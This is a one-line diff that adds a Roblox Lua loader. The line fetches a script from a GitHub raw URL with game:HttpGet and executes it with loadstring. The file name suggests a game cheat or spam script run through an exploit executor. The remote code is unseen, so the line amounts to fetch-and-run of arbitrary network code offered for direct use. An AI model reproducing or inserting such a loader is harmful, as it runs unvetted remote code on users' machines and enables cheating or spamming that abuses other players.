@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/interrogation-ai-spam2-lxar9362h0q285.lua"))()
